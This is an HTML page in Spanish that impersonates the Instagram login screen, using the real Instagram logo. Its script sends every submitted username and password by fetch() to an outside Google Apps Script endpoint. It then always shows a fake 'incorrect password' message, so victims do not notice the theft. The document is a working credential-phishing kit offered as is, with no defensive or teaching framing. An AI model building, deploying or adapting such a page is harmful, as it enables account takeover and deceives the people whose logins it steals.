<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Reset y Estilos Base */
        * { box-sizing: border-box; }
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        /* Contenedor Principal */
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 10px;
        }

        /* Logo */
        .logo {
            margin-top: 30px;
            margin-bottom: 40px;
            width: 175px;
        }
        .logo img { width: 100%; }

        /* Formulario */
        form { width: 100%; }

        .input-group {
            position: relative;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 12px 10px;
            font-size: 12px;
            color: #262626;
            outline: none;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        /* Labels flotantes simulados (estética limpia) */
        .label {
            position: absolute;
            left: 10px;
            top: 12px;
            color: #8e8e8e;
            font-size: 12px;
            pointer-events: none;
        }

        /* Botón */
        button {
            width: 100%;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #ffffff;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 10px;
            margin-top: 12px;
            cursor: pointer;
            opacity: 0.9;
            transition: opacity 0.2s;
        }

        button:hover { opacity: 1; }
        button:disabled { opacity: 0.5; cursor: default; }

        /* Separador "O" */
        .divider {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            width: 100%;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .divider::before { margin-right: 10px; }
        .divider::after { margin-left: 10px; }

        /* Enlace Olvidé contraseña */
        .forgot-password {
            display: block;
            margin-top: 16px;
            color: #385185;
            font-size: 12px;
            text-decoration: none;
            font-weight: 600;
        }

        /* Mensaje de Error */
        .error-msg {
            color: #ed4956;
            font-size: 13px;
            font-weight: 600;
            text-align: center;
            margin-top: 10px;
            min-height: 20px;
            width: 100%;
            background-color: #fff0f0;
            padding: 8px;
            border-radius: 4px;
            display: none;
            opacity: 0;
            transition: opacity 0.3s;
        }

        /* Spinner de carga */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Logo Oficial -->
        <div class="logo">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020wY07c.svg" alt="Instagram">
        </div>

        <div class="error-msg" id="errorMsg"></div>

        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
            </div>
            
            <button type="submit" id="submitBtn">
                <span id="btnText">Iniciar sesión</span>
                <div class="spinner" id="spinner"></div>
            </button>
        </form>

        <div class="divider">O</div>
        
        <div style="color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 10px;">
            Iniciar sesión con Facebook
        </div>
        
        <a href="#" class="forgot-password">¿Has olvidado la contraseña?</a>
    </div>

    <script>
        // https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec
        const SCRIPT_URL = https://script.google.com/macros/s/AKfycbznSiTmJ_vjjjX8f8hRl5PsASlB2Mbr0uxz9x3U68YFWCWR_1R1aZlXiweow9KPmqkj/exec;

        const form = document.getElementById('loginForm');
        const btn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('spinner');
        const errorMsg = document.getElementById('errorMsg');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // UI State: Loading
            btn.disabled = true;
            btnText.style.display = 'none';
            spinner.style.display = 'block';
            errorMsg.style.display = 'none';
            errorMsg.style.opacity = '0';

            // Capturar datos
            const formData = new FormData(form);

            // Enviar a Google
            fetch(SCRIPT_URL, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                // Simular delay de red
                return new Promise(resolve => setTimeout(resolve, 1500));
            })
            .then(() => {
                // UI State: Error (Realista: IG a veces muestra error aunque haya enviado)
                errorMsg.innerText = "El nombre de usuario o la contraseña es incorrecta.";
                errorMsg.style.display = 'block';
                
                // Pequeño delay para que el usuario lea el error antes de que se oculte (opcional)
                setTimeout(() => {
                    errorMsg.style.opacity = '0';
                }, 3000);

            })
            .catch(error => {
                errorMsg.innerText = "Error de conexión. Intenta de nuevo.";
                errorMsg.style.display = 'block';
            })
            .finally(() => {
                // Reset UI
                btn.disabled = false;
                btnText.style.display = 'block';
                spinner.style.display = 'none';
            });
        });
    </script>
</body>
</html>
